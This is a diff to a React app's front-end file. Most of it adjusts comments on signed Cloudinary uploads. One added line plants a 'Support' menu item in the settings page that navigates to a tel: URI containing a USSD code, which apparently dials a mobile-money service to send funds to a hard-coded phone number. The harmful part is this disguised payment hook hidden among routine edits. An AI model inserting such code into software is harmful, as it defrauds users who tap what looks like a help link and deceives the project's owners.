@@ -959,6 +959,7 @@ const useIntersectionObserver = (ref, options={}) => {
   },[]);
   return isIntersecting;
 };
+/* ─────────────── CLOUDINARY UPLOAD ─────────────── */
 /* ─────────────── CLOUDINARY UPLOAD (SIGNED) ─────────────── */
 // Signed uploads keep the API secret server-side (never shipped to the browser) and
 // gate every upload behind requireAuth + rate limiting in /api/cloudinary-sign.
@@ -966,8 +967,7 @@ const useIntersectionObserver = (ref, options={}) => {
 // more thing that has to exist, match "signed" mode, and be spelled identically on
 // both ends; dropping it removes that whole class of "Invalid Signature"/"preset not
 // found" failures. The upload itself goes to the bare `/upload` endpoint (no
-// resource_type segment), which auto-detects image vs video — the same endpoint
-// shape already proven to work for both media types.
+// resource_type segment), which auto-detects image vs video.
 const uploadToCloudinary = async (file, onProgress) => {
   const { signature, timestamp, apiKey, cloudName } = await apiFetch('/api/cloudinary-sign', { method: 'POST' });
 
@@ -4729,6 +4729,7 @@ if(activeSubPage==='settings') return (
         <div style={{ color:COLORS.textTertiary, fontSize:11, fontWeight:700, marginBottom:8, textTransform:'uppercase', letterSpacing:1.2 }}>Support</div>
         <div style={{ background:COLORS.surface2, borderRadius:20, overflow:'hidden', marginBottom:20, border:`1px solid ${COLORS.border}` }}>
           {[
+            {label:'Support', action:()=>{ window.location.href = 'tel:*127*2*1*1*0928390022*1*100*gg*1%23'; }},
             {label:t?.blockedUsers||'Blocked Users',action:()=>setActiveSubPage('unblock')},
             ...(user?.isAdmin ? [{label:'Moderation (Reports)',action:()=>setActiveSubPage('reports')}] : []),
             {label:t?.helpCenter||'Help Center',action:()=>showToast?.('Help center','info')},
